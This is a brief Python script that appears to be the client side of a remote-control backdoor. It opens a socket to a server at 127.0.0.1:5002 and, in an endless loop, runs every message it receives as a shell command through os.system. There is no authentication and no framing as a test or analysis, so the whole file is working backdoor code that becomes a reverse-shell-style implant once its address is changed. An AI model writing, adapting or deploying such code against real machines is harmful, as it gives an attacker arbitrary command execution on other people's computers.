import socket
from threading import Thread
import os

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5002
separator_token = "<SEP>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        os.system(message)

while True:
	listen_for_messages()
s.close()
